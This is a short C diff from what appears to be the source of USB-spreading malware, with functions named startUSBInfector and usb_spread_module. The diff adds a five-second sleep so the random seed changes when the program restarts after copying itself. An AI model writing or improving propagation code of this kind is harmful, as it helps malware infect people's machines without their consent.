@@ -706,6 +706,9 @@ int startUSBInfector(char *argZero) {
 int usb_spread_module(Globals * glob) {
     global = glob;
 
+    // add sleep of 5 seconds to ensure the seed of rand changes when restarting the program in the new location
+    global->sleep(5);
+
     int statusCode = 0;
     char *executedFromFilename = global->malware_path;
 
